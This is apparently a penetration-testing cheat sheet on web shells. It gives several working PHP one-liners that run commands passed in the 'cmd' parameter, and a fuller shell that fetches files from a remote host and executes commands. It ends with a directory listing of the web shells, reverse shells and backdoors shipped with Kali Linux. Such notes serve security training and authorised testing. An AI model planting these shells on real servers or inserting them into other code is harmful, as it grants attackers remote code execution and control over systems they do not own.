# Web Shells

## WebShells

WebShells are simply shells that the user can interact with on a web interface, however we can build our own malicious shells to gain remote code execution or access to the target system.

### PHP WebShells

We can use some built-in functions to execute a shell, however you may want to [read this](https://stackoverflow.com/questions/1924939/among-request-get-and-post-which-one-is-the-fastest) first if you're not sure which request method to use.

Basically:

* You should use `$_GET` when someone is requesting data **from** the application.
* You should use `$_POST` when someone is pushing _\(inserting or updating ; or deleting\)_ data **to** the application.

system\(\):

```php
<?php system($_GET['cmd']);?>
```

shell\_exec\(\):

```php
<?php shell_exec($_GET['cmd']);?>
```

exec\(\):

```php
<?php exec($_GET['cmd']);?>
```

passthru\(\): 

```php
<?php passthru($_GET['cmd']);?>
```

Very functional shell:

```php
<?php
    echo "<pre>" . system($_GET['cmd']) . "</pre>";
?>
```

We can a create a more functional shell as follows:

```php
# Upload
if (isset($_GET['fupload'])) {
    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
};
# Execute code
# shell_exec() or system() or exec()
if (isset($_GET['cmd'])) {
    echo "<pre>" . exec($_GET['cmd']) . "</pre>";
};
?>
```

## SecLists Shells

[SecLists](https://github.com/danielmiessler/SecLists) is an awesome collection of wordlists, it also includes webshells:

```text
SecLists/Web-Shells/
```

## Kali Linux Built-In WebShells

Kali Linux comes with some webshells in `asp, aspx, cfm, jsp, perl and php`which are under `/usr/share/webshells`:

```text
/usr/share/webshells/asp:
cmd-asp-5.1.asp
cmdasp.asp

/usr/share/webshells/aspx:
cmdasp.aspx

/usr/share/webshells/cfm:
cfexec.cfm

/usr/share/webshells/jsp:
cmdjsp.jsp
jsp-reverse.jsp

/usr/share/webshells/laudanum:
asp
aspx
cfm
helpers
jsp
php
wordpress
README

/usr/share/webshells/laudanum/asp:
dns.asp
file.asp
proxy.asp
shell.asp

/usr/share/webshells/laudanum/aspx:
shell.aspx

/usr/share/webshells/laudanum/cfm:
application.cfc
shell.cfm

/usr/share/webshells/laudanum/helpers:
shell.py

/usr/share/webshells/laudanum/jsp:
warfiles
cmd.war
makewar.sh

/usr/share/webshells/laudanum/jsp/warfiles:
META-INF
WEB-INF
cmd.jsp

/usr/share/webshells/laudanum/jsp/warfiles/META-INF:
MANIFEST.MF

/usr/share/webshells/laudanum/jsp/warfiles/WEB-INF:
web.xml

/usr/share/webshells/laudanum/php:
dns.php
file.php
hidden.php
host.php
killnc.php
php-reverse-shell.php
proxy.php
shell.php

/usr/share/webshells/laudanum/wordpress:
templates
laudanum.php

/usr/share/webshells/laudanum/wordpress/templates:
dns.php
file.php
host.php
ipcheck.php
killnc.php
php-reverse-shell.php
proxy.php
settings.php
shell.php

/usr/share/webshells/perl:
perl-reverse-shell.pl
perlcmd.cgi

/usr/share/webshells/php:
findsocket
php-backdoor.php
php-reverse-shell.php
qsd-php-backdoor.php
simple-backdoor.php

/usr/share/webshells/php/findsocket:
findsock.c
php-findsock-shell.php
```





